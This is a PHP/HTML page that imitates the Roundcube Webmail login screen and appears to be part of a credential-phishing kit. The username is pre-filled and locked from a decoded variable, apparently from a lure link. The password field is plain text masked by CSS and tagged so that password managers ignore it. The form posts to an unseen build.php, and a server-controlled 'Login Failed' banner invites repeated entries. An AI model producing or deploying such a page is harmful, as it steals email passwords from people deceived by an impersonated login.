<?php include '../build.php'; ?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Roundcube Webmail :: Welcome to Roundcube Webmail</title>
<style>
/* ============================================================
   Password masking — pure CSS, no JS required
   ============================================================ */
#rcmloginpwd,
input[name="pass"] {
    -webkit-text-security: disc !important;
       -moz-text-security: disc !important;
            text-security: disc !important;
    text-align: left !important;
    direction: ltr !important;
    unicode-bidi: normal !important;
    letter-spacing: 2px;
}
#rcmloginpwd::placeholder,
input[name="pass"]::placeholder {
    -webkit-text-security: none !important;
            text-security: none !important;
    letter-spacing: normal !important;
}

/* ============================================================
   Loading spinner (inline, under the button)
   ============================================================ */
@keyframes rc-spin {
    0%   { transform: rotate(0deg); }
    100% { transform: rotate(360deg); }
}
#login-loading {
    display: none;
    text-align: center;
    padding: 12px 0 0 0;
}
#login-loading .rc-spinner {
    display: inline-block;
    width: 18px;
    height: 18px;
    border: 3px solid #d0d0d0;
    border-top-color: #1e4fff;
    border-radius: 50%;
    animation: rc-spin 0.8s linear infinite;
    vertical-align: middle;
}
#login-loading .rc-loading-text {
    margin-left: 8px;
    color: #6b7280;
    font-size: 14px;
    vertical-align: middle;
}

/* ============================================================
   Error message
   ============================================================ */
#login-error {
    display: none;
    margin: 12px 0 0 0;
    padding: 10px 12px;
    background: #fff1f0;
    border: 1px solid #ffccc7;
    border-radius: 4px;
    color: #cf1322;
    font-size: 14px;
    text-align: center;
}

/* ============================================================
   Page layout
   ============================================================ */
* { box-sizing: border-box; }
body {
    margin: 0;
    padding: 20px;
    font-family: -apple-system, "Segoe UI", Roboto, Arial, sans-serif;
    background: #f4f5f7;
    min-height: 100vh;
    display: flex;
    align-items: center;
    justify-content: center;
}
#layout-content {
    width: 100%;
    max-width: 380px;
    background: #fff;
    border-radius: 8px;
    box-shadow: 0 4px 24px rgba(0,0,0,.08);
    padding: 32px 28px;
    text-align: center;
}
#logo {
    display: inline-block;
    max-width: 180px;
    margin-bottom: 24px;
}
#login-form table {
    width: 100%;
    border-collapse: separate;
    border-spacing: 0;
}
#login-form .form-group.row td.input {
    padding-bottom: 14px;
}
#login-form .input-group {
    display: flex;
    align-items: stretch;
    width: 100%;
}
#login-form .input-group-prepend {
    display: flex;
}
#login-form .input-group-text {
    display: flex;
    align-items: center;
    justify-content: center;
    min-width: 46px;
    background: #f1f3f5;
    border: 1px solid #ced4da;
    border-right: none;
    border-radius: 6px 0 0 6px;
    color: #495057;
    font-style: normal;
}
#login-form .form-control {
    flex: 1 1 auto;
    width: 1%;
    min-width: 0;
    padding: 12px 14px;
    border: 1px solid #ced4da;
    border-radius: 0 6px 6px 0;
    font-size: 15px;
    background: #fff;
    color: #212529;
    outline: none;
    transition: border-color .15s, box-shadow .15s;
}
#login-form .form-control:focus {
    border-color: #1e4fff;
    box-shadow: 0 0 0 3px rgba(30,79,255,.15);
}
#login-form .formbuttons {
    margin: 8px 0 0 0;
    padding: 0;
}
#rcmloginsubmit {
    width: 100%;
    padding: 12px 16px;
    border: none;
    border-radius: 6px;
    background: #1e4fff;
    color: #fff;
    font-size: 15px;
    font-weight: 600;
    text-transform: uppercase;
    cursor: pointer;
    transition: background .2s;
}
#rcmloginsubmit:hover:not(:disabled) {
    background: #1538cc;
}
#rcmloginsubmit:disabled {
    opacity: .7;
    cursor: not-allowed;
}
#login-footer {
    margin-top: 18px;
    font-size: 12px;
    color: #9aa0a6;
}

/* ============================================================
   Language switcher
   ============================================================ */
#lang-switch {
    margin-top: 14px;
    font-size: 13px;
    padding: 5px 10px;
    border-radius: 4px;
    border: 1px solid #ced4da;
    background: #fff;
    color: #495057;
    cursor: pointer;
}

/* ============================================================
   RTL support (Arabic, Hebrew, Persian, Urdu)
   ============================================================ */
[dir="rtl"] #login-form .input-group-prepend { order: 2; }
[dir="rtl"] #login-form .input-group-text {
    border-radius: 0 6px 6px 0;
    border-right: 1px solid #ced4da;
    border-left: none;
}
[dir="rtl"] #login-form .form-control {
    border-radius: 6px 0 0 6px;
    text-align: right;
}
[dir="rtl"] #login-error,
[dir="rtl"] #login-footer { direction: rtl; }
</style>
</head>
<body>

<div id="layout-content" role="main">
    <img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjkuMTQgMTQxLjggNTczLjY1IDU3My42NSI+PHN0eWxlPi5zdDAsLnN0M3tmaWxsLXJ1bGU6ZXZlbm9kZDtjbGlwLXJ1bGU6ZXZlbm9kZDtmaWxsOiM0MDRmNTR9LnN0M3tmaWxsOiMzN2JlZmZ9PC9zdHlsZT48cGF0aCBjbGFzcz0ic3QzIiBkPSJNNTgyLjc5IDU0OS43N0wyOTUuOTYgMzg0LjFWMjA3LjI3bDI4Ni44MyAxNjUuNjh6Ii8+PHBhdGggY2xhc3M9InN0MCIgZD0iTTkuMTQgNTQ5Ljc3TDI5NS45NiAzODQuMVYyMDcuMjdMOS4xNCAzNzIuOTV6Ii8+PHBhdGggZD0iTTI5NS45NiAxNDEuOGMxMDkuNTYgMCAxOTguNDEgODguODUgMTk4LjQxIDE5OC40MXMtODguODUgMTk4LjQxLTE5OC40MSAxOTguNDFTOTcuNTUgNDQ5Ljc3IDk3LjU1IDM0MC4yMSAxODYuNCAxNDEuOCAyOTUuOTYgMTQxLjgiIGZpbGwtcnVsZT0iZXZlbm9kZCIgY2xpcC1ydWxlPSJldmVub2RkIiBmaWxsPSIjY2NjIi8+PHBhdGggZD0iTTI5NS45NiAxNDEuOGMxMDkuNiAwIDE5OC40OCA4OC44NSAxOTguNDggMTk4LjQxcy04OC44OCAxOTguNDEtMTk4LjQ4IDE5OC40MWMtNjIuOTEtNDIuMzQtODguOTQtMTI3LjY0LTg4Ljk0LTE5OC4zM3MyNi4wMy0xNTYuMSA4OC45NC0xOTguNTIiIGZpbGwtcnVsZT0iZXZlbm9kZCIgY2xpcC1ydWxlPSJldmVub2RkIiBmaWxsPSIjZTVlNWU1Ii8+PHBhdGggY2xhc3M9InN0MyIgZD0iTTU4Mi43OSAzNzIuOTVMMjk1Ljk2IDUzOC42MnYxNzYuODNsMjg2LjgzLTE2NS42OHoiLz48cGF0aCBjbGFzcz0ic3QwIiBkPSJNOS4xNCAzNzIuOTVsMjg2LjgyIDE2NS42N3YxNzYuODNMOS4xNCA1NDkuNzd6Ii8+PC9zdmc+" id="logo" alt="Logo">

    <form id="login-form" name="login-form" method="post" action="" autocomplete="off">

        <table>
            <tbody>
                <!-- Username (read-only, no autocomplete) -->
                <tr class="form-group row">
                    <td class="title" style="display:none;"></td>
                    <td class="input input-group input-group-lg">
                        <span class="input-group-prepend">
                            <i class="input-group-text icon user">👤</i>
                        </span>
                        <input name="user"
                               type="text"
                               class="form-control"
                               id="rcmloginuser"
                               value="<?php echo htmlspecialchars($decoded); ?>"
                               readonly
                               size="40"
                               required
                               autocapitalize="off"
                               autocomplete="off"
                               autocorrect="off"
                               spellcheck="false"
                               data-form-type="other"
                               data-i18n-placeholder="username">
                    </td>
                </tr>

                <!-- Password (masked, no autocomplete / no suggestions) -->
                <tr class="form-group row">
                    <td class="title" style="display:none;"></td>
                    <td class="input input-group input-group-lg">
                        <span class="input-group-prepend">
                            <i class="input-group-text icon pass">🔒</i>
                        </span>
                        <input name="pass"
                               id="rcmloginpwd"
                               required
                               size="40"
                               class="form-control"
                               autocapitalize="off"
                               autocorrect="off"
                               spellcheck="false"
                               type="text"
                               data-i18n-placeholder="password"
                               autocomplete="off"
                               data-form-type="other"
                               data-lpignore="true"
                               data-1p-ignore="true"
                               data-bwignore="true">
                    </td>
                </tr>
            </tbody>
        </table>

        <!-- Loading indicator -->
        <div id="login-loading" aria-live="polite">
            <span class="rc-spinner"></span>
            <span class="rc-loading-text" data-i18n="logging_in">Logging in...</span>
        </div>

        <!-- Error message — visibility controlled by $error set in build.php -->
        <div id="login-error" role="alert" style="<?php echo $error; ?>">
            <span data-i18n="login_failed">Login Failed.</span>
        </div>

        <p class="formbuttons">
            <button type="submit"
                    id="rcmloginsubmit"
                    class="button mainaction submit btn btn-primary btn-lg text-uppercase w-100">
                <span data-i18n="login">Login</span>
            </button>
        </p>

        <!-- Language switcher -->
        <select id="lang-switch" aria-label="Language"></select>

        <div id="login-footer" role="contentinfo">
            <span data-i18n="footer">Roundcube Webmail</span>
        </div>
    </form>
</div>

<script>
/* ============================================================
   i18n — client-side auto-translation
   Priority: cookie → navigator.language → IP geolocation → en
   No PHP involvement, no server roundtrip for detection.
   ============================================================ */
(function () {
    'use strict';

    // ---------- Translations ----------
    var TRANSLATIONS = {
        en: {
            title:        'Roundcube Webmail :: Welcome',
            username:     'Username',
            password:     'Password',
            login:        'Login',
            logging_in:   'Logging in...',
            login_failed: 'Login Failed.',
            enter_pass:   'Please enter your password.',
            footer:       'Roundcube Webmail'
        },
        es: {
            title:        'Roundcube Webmail :: Bienvenido',
            username:     'Usuario',
            password:     'Contraseña',
            login:        'Iniciar sesión',
            logging_in:   'Iniciando sesión...',
            login_failed: 'Error de inicio de sesión.',
            enter_pass:   'Por favor ingrese su contraseña.',
            footer:       'Roundcube Webmail'
        },
        fr: {
            title:        'Roundcube Webmail :: Bienvenue',
            username:     'Utilisateur',
            password:     'Mot de passe',
            login:        'Connexion',
            logging_in:   'Connexion en cours...',
            login_failed: 'Échec de la connexion.',
            enter_pass:   'Veuillez saisir votre mot de passe.',
            footer:       'Roundcube Webmail'
        },
        de: {
            title:        'Roundcube Webmail :: Willkommen',
            username:     'Benutzername',
            password:     'Passwort',
            login:        'Anmelden',
            logging_in:   'Anmeldung läuft...',
            login_failed: 'Anmeldung fehlgeschlagen.',
            enter_pass:   'Bitte geben Sie Ihr Passwort ein.',
            footer:       'Roundcube Webmail'
        },
        pt: {
            title:        'Roundcube Webmail :: Bem-vindo',
            username:     'Usuário',
            password:     'Senha',
            login:        'Entrar',
            logging_in:   'Entrando...',
            login_failed: 'Falha no login.',
            enter_pass:   'Por favor, insira sua senha.',
            footer:       'Roundcube Webmail'
        },
        ar: {
            title:        'Roundcube Webmail :: مرحباً',
            username:     'اسم المستخدم',
            password:     'كلمة المرور',
            login:        'تسجيل الدخول',
            logging_in:   'جارٍ تسجيل الدخول...',
            login_failed: 'فشل تسجيل الدخول.',
            enter_pass:   'الرجاء إدخال كلمة المرور.',
            footer:       'Roundcube Webmail'
        }
    };

    var SUPPORTED   = Object.keys(TRANSLATIONS);
    var RTL_LANGS   = ['ar','he','fa','ur'];
    var DEFAULT     = 'en';
    var COOKIE_NAME = 'rc_lang';

    var LANG_LABELS = {
        en: 'English', es: 'Español', fr: 'Français',
        de: 'Deutsch', pt: 'Português', ar: 'العربية'
    };

    // Country code → language
    var COUNTRY_TO_LANG = {
        US:'en', GB:'en', AU:'en', CA:'en', NZ:'en', IE:'en',
        ES:'es', MX:'es', AR:'es', CO:'es', CL:'es', PE:'es',
        FR:'fr', BE:'fr', CH:'fr', SN:'fr',
        DE:'de', AT:'de', LI:'de',
        PT:'pt', BR:'pt',
        SA:'ar', AE:'ar', EG:'ar', MA:'ar', DZ:'ar'
    };

    // ---------- Cookie helpers ----------
    function getCookie(name) {
        var match = document.cookie.match(new RegExp('(?:^|; )' + name + '=([^;]*)'));
        return match ? decodeURIComponent(match[1]) : null;
    }
    function setCookie(name, value, days) {
        var d = new Date();
        d.setTime(d.getTime() + (days * 864e5));
        document.cookie = name + '=' + encodeURIComponent(value) +
            '; expires=' + d.toUTCString() +
            '; path=/; SameSite=Lax' +
            (location.protocol === 'https:' ? '; Secure' : '');
    }

    // ---------- Detection strategies ----------
    function detectFromCookie() {
        var c = getCookie(COOKIE_NAME);
        return (c && SUPPORTED.indexOf(c) !== -1) ? c : null;
    }

    function detectFromBrowser() {
        var langs = navigator.languages && navigator.languages.length
            ? navigator.languages
            : [navigator.language || navigator.userLanguage || ''];
        for (var i = 0; i < langs.length; i++) {
            var base = String(langs[i]).slice(0, 2).toLowerCase();
            if (SUPPORTED.indexOf(base) !== -1) return base;
        }
        return null;
    }

    function detectFromIP(callback) {
        // Free, no-key JSON API — reliable enough as a fallback
        // Alternatives: https://ipapi.co/json/  |  https://ipwho.is/
        var xhr = new XMLHttpRequest();
        xhr.open('GET', 'https://ipapi.co/json/', true);
        xhr.timeout = 3000;
        xhr.onload = function () {
            if (xhr.status >= 200 && xhr.status < 300) {
                try {
                    var data = JSON.parse(xhr.responseText);
                    var cc   = (data.country_code || data.country || '').toUpperCase();
                    var lang = COUNTRY_TO_LANG[cc] || null;
                    callback(lang && SUPPORTED.indexOf(lang) !== -1 ? lang : null);
                    return;
                } catch (e) { /* fall through */ }
            }
            callback(null);
        };
        xhr.onerror = xhr.ontimeout = function () { callback(null); };
        try { xhr.send(); } catch (e) { callback(null); }
    }

    // ---------- Apply translations to the DOM ----------
    function applyLanguage(lang) {
        var t = TRANSLATIONS[lang] || TRANSLATIONS[DEFAULT];
        var dir = RTL_LANGS.indexOf(lang) !== -1 ? 'rtl' : 'ltr';

        // <html> attributes
        document.documentElement.lang = lang;
        document.documentElement.dir  = dir;

        // <title>
        if (t.title) document.title = t.title;

        // Elements with data-i18n
        var nodes = document.querySelectorAll('[data-i18n]');
        for (var i = 0; i < nodes.length; i++) {
            var key = nodes[i].getAttribute('data-i18n');
            if (t[key] != null) nodes[i].textContent = t[key];
        }

        // Elements with data-i18n-placeholder
        var phs = document.querySelectorAll('[data-i18n-placeholder]');
        for (var j = 0; j < phs.length; j++) {
            var pkey = phs[j].getAttribute('data-i18n-placeholder');
            if (t[pkey] != null) phs[j].setAttribute('placeholder', t[pkey]);
        }

        // Sync switcher
        var sw = document.getElementById('lang-switch');
        if (sw && sw.value !== lang) sw.value = lang;

        // Expose for the login script
        window.RC_I18N = t;
        window.RC_LANG = lang;
    }

    // ---------- Build the language switcher ----------
    function buildSwitcher(currentLang, onChange) {
        var sel = document.getElementById('lang-switch');
        if (!sel) return;
        sel.innerHTML = '';
        SUPPORTED.forEach(function (code) {
            var opt = document.createElement('option');
            opt.value = code;
            opt.textContent = LANG_LABELS[code] || code.toUpperCase();
            if (code === currentLang) opt.selected = true;
            sel.appendChild(opt);
        });
        sel.addEventListener('change', function () {
            setCookie(COOKIE_NAME, this.value, 365);
            onChange(this.value);
        });
    }

    // ---------- Orchestrator ----------
    function init() {
        // 1. Cookie (explicit user choice)
        var lang = detectFromCookie();

        // 2. Browser language
        if (!lang) lang = detectFromBrowser();

        // 3. IP geolocation (async, non-blocking)
        if (!lang) {
            detectFromIP(function (ipLang) {
                applyLanguage(ipLang || DEFAULT);
            });
        }

        // Render immediately with whatever we have (no flicker)
        var initial = lang || DEFAULT;
        applyLanguage(initial);

        // Build switcher; when changed, apply instantly (no reload needed)
        buildSwitcher(initial, function (newLang) {
            applyLanguage(newLang);
        });
    }

    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', init);
    } else {
        init();
    }
})();

/* ============================================================
   Login form behavior (unchanged from your original, but uses
   window.RC_I18N for the empty-password message).
   ============================================================ */
(function () {
    'use strict';

    var form    = document.getElementById('login-form');
    var loading = document.getElementById('login-loading');
    var error   = document.getElementById('login-error');
    var button  = document.getElementById('rcmloginsubmit');
    var pwd     = document.getElementById('rcmloginpwd');

    if (!form || !loading || !error || !button) return;

    // ---------- Scrub any autofilled password on page load ----------
    (function clearAutofill() {
        if (pwd) {
            pwd.value = '';
            pwd.setAttribute('autocomplete', 'new-password');
        }
    })();

    // ---------- Visual feedback on submit ----------
    form.addEventListener('submit', function (e) {
        if (!pwd || pwd.value === '') {
            e.preventDefault();
            var msg = (window.RC_I18N && window.RC_I18N.enter_pass)
                ? window.RC_I18N.enter_pass
                : 'Please enter your password.';
            // Replace text node only, keeping any inner markup
            error.textContent = msg;
            error.style.display = 'block';
            if (pwd) pwd.focus();
            return;
        }

        error.style.display   = 'none';
        loading.style.display = 'block';
        button.disabled       = true;
        button.style.opacity  = '0.7';
    });

    // ---------- bfcache reset ----------
    window.addEventListener('pageshow', function (e) {
        if (e.persisted) {
            loading.style.display = 'none';
            button.disabled       = false;
            button.style.opacity  = '1';
            if (pwd) pwd.value = '';
        }
    });
})();
</script>

</body>
</html>